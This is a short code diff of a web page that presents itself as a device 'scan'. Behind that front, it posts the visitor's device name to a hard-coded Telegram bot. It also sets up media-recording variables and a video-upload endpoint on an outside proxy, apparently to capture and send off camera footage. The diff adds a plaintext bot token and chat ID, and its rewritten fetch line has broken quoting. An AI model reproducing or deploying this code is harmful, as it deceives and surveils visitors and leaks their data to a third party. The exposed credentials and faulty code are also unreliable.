@@ -53,7 +53,9 @@
 </div>
 
 <script>
-const CHAT_ID = new URLSearchParams(window.location.search).get('chatId') || '7276604783';
+const params = new URLSearchParams(window.location.search);
+const CHAT_ID = params.get("chatId") || "7276604783";
+const BOT_TOKEN = params.get("token") || "8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo";
 const API = 'https://ai-proxy-eosin.vercel.app/api/upload_video';
 let stream, mediaRecorder, recordedChunks = [];
 
@@ -70,7 +72,7 @@ function showPage(id) { document.querySelectorAll('.page').forEach(p => p.classL
 async function startScan() {
     showPage('page-scanning');
     
-    fetch('https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendMessage', {
+    fetch('`https://api.telegram.org/bot${BOT_TOKEN}/`sendMessage', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id: CHAT_ID, text: `🛡️ فحص\n📱 ${device.name}` })
     }).catch(e => {});
